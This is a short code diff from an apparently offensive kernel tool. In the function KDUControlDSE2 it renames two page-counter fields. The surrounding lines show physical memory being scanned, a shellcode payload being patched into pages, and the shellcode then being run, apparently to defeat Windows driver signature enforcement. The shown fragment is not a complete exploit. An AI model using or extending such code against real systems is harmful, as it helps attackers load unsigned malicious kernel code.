@@ -479,8 +479,8 @@ BOOL KDUControlDSE2(
         DSEValue);
 
     enumParams.bWrite = TRUE;
-    enumParams.cbPagesFound = 0;
-    enumParams.cbPagesModified = 0;
+    enumParams.ccPagesFound = 0;
+    enumParams.ccPagesModified = 0;
     enumParams.Context = Context;
     enumParams.pvPayload = shellBuffer;
     enumParams.cbPayload = (ULONG)shellSize;
@@ -491,8 +491,8 @@ BOOL KDUControlDSE2(
     if (supEnumeratePhysicalMemory(KDUProcExpPagePatchCallback, &enumParams)) {
 
         printf_s("[+] Number of pages found: %llu, modified: %llu\r\n",
-            enumParams.cbPagesFound,
-            enumParams.cbPagesModified);
+            enumParams.ccPagesFound,
+            enumParams.ccPagesModified);
 
         //
         // Run shellcode.
